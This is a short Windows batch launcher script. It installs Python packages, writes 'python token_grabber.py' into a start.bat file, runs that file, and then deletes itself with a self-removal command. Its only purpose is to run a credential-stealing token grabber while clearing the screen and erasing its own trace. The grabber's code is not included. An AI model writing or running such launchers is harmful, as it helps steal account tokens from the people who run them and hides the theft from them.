python -m pip install pystyle
python -m pip install requests
python -m pip install os
python -m pip install shutil
cls
echo python token_grabber.py >> start.bat
start start.bat
start /b "" cmd /c del "%~f0"&exit /b